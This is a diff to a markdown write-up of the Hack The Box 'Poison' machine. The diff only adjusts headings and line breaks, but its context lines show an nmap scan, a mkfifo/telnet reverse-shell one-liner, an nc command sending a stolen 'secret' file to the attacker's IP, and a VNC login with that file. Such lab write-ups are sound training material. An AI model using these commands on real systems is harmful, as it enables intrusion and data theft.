@@ -1,4 +1,4 @@
-## Nmap scan:
+### Nmap scan:
 ```
 # Nmap 7.92 scan initiated Wed Jan 11 23:04:19 2023 as: nmap -sC -sV -vv -oA quick 10.10.10.84
 Nmap scan report for 10.10.10.84
@@ -59,10 +59,11 @@ Since there is RCE, I could send a reverse shell and connect into the machine, I
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.10.14.34 443 > /tmp/f
 ```
 
-And it worked:
+
+And it worked: </br>
 ![initial_shell](images/poison/initial_shell.png)
 
-## Shell as charix:
+### Shell as charix:
 
 I enumerated from the directory I was inside, and I saw a file called ```pwdbackup.txt```: </br>
 ```
@@ -109,7 +110,7 @@ $ ls /home
 charix
 ```
 
-I got inside using SSH:
+I got inside using SSH: </br>
 ![charix_shell](images/poison/charix_shell.png)
 
 # Privilege Escalation
@@ -126,7 +127,7 @@ charix@Poison:~ % cat secret | hexdump -C
 
 Looks like a binary file, at this point I Had no idea how could it help me, so I continued to enumerate the machine. </br>
 
-Listing all of the proccess running on the system with ```ps aux``` :**
+Listing all of the proccess running on the system with ```ps aux```:
 ```
 root   529   0.0  0.9 23620  8872 v0- I    00:49    0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000
 ```
@@ -166,5 +167,5 @@ nc -w 3 10.10.14.34 443 < secret
 vncviewer 127.0.0.1:5901 -passwd secret
 ```
 
-
+**It worked!** </br>
 ![root_shell](images/poison/root_shell.png)
